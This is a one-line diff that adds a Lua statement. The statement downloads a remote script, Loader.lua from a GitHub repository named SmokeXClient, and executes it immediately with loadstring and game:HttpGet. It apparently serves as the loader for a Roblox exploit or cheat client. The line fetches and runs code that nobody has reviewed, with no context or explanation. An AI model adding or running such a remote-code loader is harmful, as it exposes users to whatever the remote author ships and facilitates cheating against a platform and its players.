@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xysimdev/SmokeXClient/main/Loader.lua", true))()
